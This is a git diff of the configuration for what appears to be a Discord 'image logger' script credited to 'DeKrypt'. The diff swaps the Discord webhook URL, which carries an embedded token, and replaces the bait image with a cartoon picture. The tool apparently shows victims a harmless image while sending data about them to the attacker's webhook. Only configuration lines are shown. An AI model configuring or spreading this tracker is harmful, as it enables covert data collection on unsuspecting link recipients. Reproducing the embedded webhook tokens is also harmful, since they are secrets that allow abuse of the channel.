@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1477792435697483921/E0zO1fzDrmZzpWLBuAHJDLrjQzV2w35jCzqwywwzOfmFNYtgUYCnY-sm9zbPy-4fUE1a",
-    "image": "https://www.okwind.com/wp-content/uploads/2024/04/agriculture-scaled-1920x1080.jpg", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1479850026808119448/EY4XqbACn247TkMj0QbM-26RyV1szYvAIxc07tnygtlAyDyomciGHUms85bDBKauG5YU",
+    "image": "https://lumiere-a.akamaihd.net/v1/images/ct_videoportal_pixar_mikewazoski_ddt-16832_a98c6c65.jpeg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
